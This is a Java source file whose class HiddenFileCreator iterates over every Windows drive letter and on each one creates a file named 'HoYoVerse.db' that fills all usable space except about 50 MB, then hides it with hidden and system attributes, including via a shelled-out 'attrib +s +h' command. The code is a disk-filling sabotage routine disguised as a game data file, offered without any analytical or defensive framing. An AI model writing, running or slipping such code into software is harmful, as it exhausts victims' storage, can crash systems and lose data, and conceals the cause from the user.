package game.over;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileStore;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.attribute.DosFileAttributeView;
import java.util.ArrayList;
import java.util.List;

public class HiddenFileCreator {
    public static void createHiddenFiles() {
        List<String> diskList = getDiskList();
        for (String disk : diskList) {
            createHiddenFile(disk + "/HoYoVerse.db", checkSize(disk) - 50000000); // 50 MB
        }
    }

    private static List<String> getDiskList() {
        List<String> diskList = new ArrayList<>();
        for (char c = 'A'; c <= 'Z'; c++) {
            String disk = c + ":";
            File file = new File(disk);
            if (file.isDirectory()) {
                diskList.add(disk);
            }
        }
        return diskList;
    }

    private static void createHiddenFile(String filename, long size) {
        try (FileOutputStream fos = new FileOutputStream(filename)) {
            fos.getChannel().position(size - 1);
            fos.write(0);

            File file = new File(filename);
            if (file.exists()) {
                DosFileAttributeView dosAttrs = Files.getFileAttributeView(file.toPath(), DosFileAttributeView.class);
                if (dosAttrs != null) {
                    dosAttrs.setHidden(true);
                }

                String command = "attrib +s +h " + filename;
                Process process = Runtime.getRuntime().exec(command);
                process.waitFor();
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static long checkSize(String disk) {
        try {
            FileStore fileStore = Files.getFileStore(FileSystems.getDefault().getPath(disk));
            return fileStore.getUsableSpace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return 0;
    }
}